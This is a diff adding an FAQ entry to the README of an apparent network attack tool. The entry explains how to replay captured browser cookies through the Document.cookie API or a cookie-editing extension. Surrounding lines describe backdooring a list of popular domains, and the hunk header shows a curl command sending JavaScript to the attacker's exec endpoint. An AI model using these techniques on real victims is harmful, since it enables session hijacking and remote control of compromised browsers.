@@ -208,6 +208,8 @@ curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",funct
 
 * **Q:** How do you add additional domains to be backdoored?
 * **A:** The list of domains to be backdoored is set in `target_injected_xhtmljs.html` by the `getDoms()` function. This itself is populated by the `alexa1m.sh` script in the root of the repo. If you wish to add additional domains to this list, you can simply amend the return call in `getDoms()`.
+* **Q:** How do you use the captured cookies?
+* **A:** You can use the [Document.cookie API](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) directly from the JavaScript console in your browser to set cookies. [This StackOverflow post](https://superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome) also has a few Chrome-specific suggestions, for example the [Cookie Inspector](https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn) Chrome extension.
 
 -----
 
